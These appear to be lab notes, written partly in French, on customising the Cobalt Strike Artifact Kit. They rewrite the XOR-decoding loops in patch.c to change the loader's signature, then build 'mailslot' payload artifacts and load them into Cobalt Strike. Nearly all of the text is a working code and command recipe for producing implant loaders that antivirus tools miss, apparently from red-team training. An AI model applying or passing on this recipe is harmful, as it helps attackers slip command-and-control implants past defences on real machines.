

1. Visual Studio Code, Go to **File > Open Folder** and select _C:\Tools\cobaltstrike\arsenal-kit\kits\artifact_.

2. Aller dans patch.c , remplacer la boucle for ligne 45 par cette boucle while

```
x = length;
while(x--) {
  *((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 8];
}
```

3. Aller ligne ~116 et modificer la boucle for par cette boucle while

```
int x = length;
while(x--) {
  *((char *)ptr + x) = *((char *)buffer + x) ^ key[x % 8];
}
```

4. Build les artefacts depuis wsl

```
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```

5. Lancer cobalt strike et charger les artefacts depuis _C:\Tools\cobaltstrike\custom-artifacts\mailslot_.
